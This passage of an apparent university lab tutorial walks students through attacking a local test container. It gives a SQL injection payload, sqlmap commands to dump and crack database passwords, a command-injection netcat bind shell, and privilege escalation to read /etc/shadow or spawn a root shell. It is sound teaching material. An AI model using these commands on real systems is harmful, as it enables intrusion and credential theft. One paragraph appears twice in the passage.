+<code class="docutils literal"><span class="pre">&quot;1</span> <span class="pre">AND</span> <span class="pre">1=0</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">null,</span> <span class="pre">concat(table_name,0x0a,column_name)</span> <span class="pre">FROM</span> <span class="pre">information_schema.columns</span> <span class="pre">WHERE</span> <span class="pre">table_name</span> <span class="pre">=</span> <span class="pre">'cats'</span> <span class="pre">#&quot;</span></code>.
+The result of this command will show you that this table has 4 rows:
+<code class="docutils literal"><span class="pre">id,</span> <span class="pre">name,</span> <span class="pre">birth_date</span></code> and <code class="docutils literal"><span class="pre">chip</span></code>. Great our chip <code class="docutils literal"><span class="pre">id</span></code> is here
+and called <code class="docutils literal"><span class="pre">chip</span></code>.</p>
+</li>
+</ul>
+<div class="line-block">
+<div class="line">As we’ve seen, an SQL Injection allow to read data we aren’t supposed
+to read. But what’s interesting is if the user used by the website has
+admin privileges, we could even try to read the informations about
+other databases or SQL users. But these queries are pretty complex, so
+let’s use a tool for that.</div>
+<div class="line">SQLMap is a tool that will perform SQL injections for you, so let’s
+try it. Run sqlmap with the command:</div>
+</div>
+<p><code class="docutils literal"><span class="pre">sqlmap</span> <span class="pre">-u</span> <span class="pre">&quot;http://172.17.0.2/cats.php?id=1&amp;Submit=Submit&quot;</span> <span class="pre">--string=&quot;Name&quot;</span> <span class="pre">--users</span> <span class="pre">--password</span></code></p>
+<p>SQLMap will first scan the database for injectable parameters. Then, it
+will extract (if possible) a list of the users and their hashed
+password. Upon success, sqlmap will try a bruteforce attack on the
+hashed passwords it extracted. When done, sqlmap should show you the
+login and passwords of several SQL users, write them done this could be
+useful.</p>
+<p><img alt="image" src="imageTP/8.PNG" /></p>
+<p>You can also have the list of all databases with:</p>
+<p><code class="docutils literal"><span class="pre">sqlmap</span> <span class="pre">-u</span> <span class="pre">&quot;http://172.17.0.2/cats.php?id=1&amp;Submit=Submit&quot;</span> <span class="pre">--string=&quot;Name&quot;</span> <span class="pre">--dbs</span></code></p>
+<p>One is called phpmyadmin? That’s interesting. PHPMyadmin is a tool to
+manager SQL databases. Try the URL <a class="reference external" href="http://172.17.0.2/phpmyadmin/">http://172.17.0.2/phpmyadmin/</a> and try
+the admin password you found previously. You should have access to all
+the databases and their content.</p>
+</div>
+<div class="section" id="command-injection-metasploit">
+<h3>Command Injection - <code class="docutils literal"><span class="pre">Metasploit</span></code><a class="headerlink" href="#command-injection-metasploit" title="Permalink to this headline">¶</a></h3>
+<div class="line-block">
+<div class="line">Is it possible to make this website run another command? Think about
+it and about how bash works and try it. When you’re done, go to the
+next line. An interesting thing about bash, is that you can “chain”
+commands by using the character “;”. For instance, of you type echo
+“hello”; echo “world” in your terminal, it will execute echo “hello”
+first and then echo “world”.</div>
+<div class="line">It would be easier to have a bash terminal right? We can do that!</div>
+</div>
+<p>Let’s try to open a netcat on the machine so we can directly connect to
+it. For that use this input
+<code class="docutils literal"><span class="pre">8.8.8.8;</span> <span class="pre">mkfifo</span> <span class="pre">/tmp/pipe;sh</span> <span class="pre">/tmp/pipe</span> <span class="pre">|</span> <span class="pre">nc</span> <span class="pre">-l</span> <span class="pre">-p</span> <span class="pre">1234</span> <span class="pre">&gt;</span> <span class="pre">/tmp/pipe</span></code>.</p>
+<p><img alt="image" src="imageTP/8.PNG" /></p>
+<p>This command is a bit complicated, but we basically tell netcat (nc) to
+listen on the port 1234 for a TCP connection, and we will communicate
+with a named pipe so the traffic can go both ways.</p>
+<p>In the terminal open Metasploit by typing <code class="docutils literal"><span class="pre">msfconsole</span></code>. Type use
+<code class="docutils literal"><span class="pre">multi/handler</span></code>.</p>
+<p><img alt="image" src="imageTP/8.PNG" /></p>
+<p>An interesting command would be the command to look into the users of
+the system (whoami -&gt; user -&gt; apache2). In Linux, the users are stored
+in <code class="docutils literal"><span class="pre">/etc/passwd</span></code>. If you look closely, there’s a user called “site”.
+Did we already see this username before? (for this example).</p>
+<p>Type <code class="docutils literal"><span class="pre">ssh</span> <span class="pre">site&#64;172.17.0.2</span></code> and use the preceding password found with
+SQLMap</p>
+<p><img alt="image" src="imageTP/8.PNG" /></p>
+<div class="line-block">
+<div class="line">a user is cool, but couldn’t we go further and try to become root ? In
+Linux, <code class="docutils literal"><span class="pre">/etc/passwd</span></code> contains the users, <code class="docutils literal"><span class="pre">/etc/shadow</span></code> contains
+the hashed passwords and you can’t access <code class="docutils literal"><span class="pre">/etc/shadow</span></code> unless
+you’re root.</div>
+<div class="line">Python is often allowed to run as root, and it’s a very bad practice:</div>
+</div>
+<ul class="simple">
+<li><code class="docutils literal"><span class="pre">/usr/sbin/john</span></code> is an utility that bruteforce password files</li>
+<li><code class="docutils literal"><span class="pre">/usr/sbin/unshadow</span></code> is a commands that merges the result of
+<code class="docutils literal"><span class="pre">/etc/passwd</span></code> and <code class="docutils literal"><span class="pre">/etc/shadow</span></code> to put them in a format readable
+by john</li>
+</ul>
+<div class="line-block">
+<div class="line">a user is cool, but couldn’t we go further and try to become root ? In
+Linux, <code class="docutils literal"><span class="pre">/etc/passwd</span></code> contains the users, <code class="docutils literal"><span class="pre">/etc/shadow</span></code> contains
+the hashed passwords and you can’t access <code class="docutils literal"><span class="pre">/etc/shadow</span></code> unless
+you’re root.</div>
+<div class="line">Python is often allowed to run as root, and it’s a very bad practice:</div>
+</div>
+<ul class="simple">
+<li><code class="docutils literal"><span class="pre">/usr/sbin/john</span></code> is an utility that bruteforce password files</li>
+<li><code class="docutils literal"><span class="pre">/usr/sbin/unshadow</span></code> is a commands that merges the result of
+<code class="docutils literal"><span class="pre">/etc/passwd</span></code> and <code class="docutils literal"><span class="pre">/etc/shadow</span></code> to put them in a format readable
+by john</li>
+</ul>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;cat /etc/shadow&#39;</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>Or</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>sudo python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+
+
+    </div>
+      
+  </div>
+</div>
+<footer class="footer">
+  <div class="container">
+    <p class="pull-right">
+      <a href="#">Back to top</a>
+      
+        <br/>
+        
+<div id="sourcelink">
+  <a href="_sources/introduction.rst.txt"
+     rel="nofollow">Source</a>
+</div>
+      
+    </p>
+    <p>
+        &copy; Copyright 2020, Legay Axel, Dûchene Fabien, Crochet Christophe, Schmitz Donatien.<br/>
+      Created using <a href="http://sphinx-doc.org/">Sphinx</a> 1.6.7.<br/>
+    </p>
+  </div>
+</footer>
+  </body>
+</html>
